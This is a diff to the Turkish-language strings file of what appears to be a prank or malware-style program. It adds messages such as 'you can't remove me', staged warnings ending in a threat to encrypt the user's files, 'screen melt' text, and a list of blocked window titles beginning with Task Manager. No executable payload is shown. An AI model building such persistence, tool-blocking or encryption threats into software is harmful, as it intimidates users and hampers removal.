@@ -1,4 +1,4 @@
-from .util import get_lang
+from .util import GetLocalLocale as get_lang
 
 
 class strings:
@@ -13,21 +13,22 @@ class strings:
             "string_user_warning_note":"NOT:Program tehlikelidir ve lütfen gerçek bir bilgisayarda açmayınız açılmaması için engel koyulmuştur",
 
 
-            "string_you_cant_remove_me":"",
-            "string_user_opened_not_allowed_process_msg":"",
-            "string_user_opened_not_allowed_process_msg_stage01":"",
-            "string_user_opened_not_allowed_process_msg_stage02":"",
-            "string_user_opened_not_allowed_process_msg_stage03":"",
-            "string_user_opened_not_allowed_process_msg_stage04":"",
-            
+            "string_you_cant_remove_me":"Beni silemezsin",
+            "notepad_payload_stages":{
+                0:"Hayır bunu açamazsın",
+                1:"Bunları açman yasak",
+                2:"Bu 2. sana bunları açman yasak dedim",
+                3:"Bu 3.oldu sana bunları açman yasak dedim",
+                4:"Bundan sonra bunları her açtığında herhangi bir dosyanı ve şifreleyeceğim."
+            },
             "string_user_have_blacklisted_program":"Kullanılması yasak program kullandın Program ismi: %s PID:%s",
 
-            "string_user_kidding":"",
+            "string_user_kidding":"Seninle eğlenme vakti",
             "string_file_dont_click_me":"bana_tıklama.txt",
-            "string_user_i_said_to_you_dont_click_to_me":"",
+            "string_user_i_said_to_you_dont_click_to_me":"Ben sana bana tıklama dedim peki bunu sen istedin",
             
 
-            "string_user_screen_melt":"",
+            "string_user_screen_melt":"Ekranın biraz eriyecek ama olsun :)",
 
             "string_user_opened_not_allowed_wintitles":[
                 "görev yöneticisi",
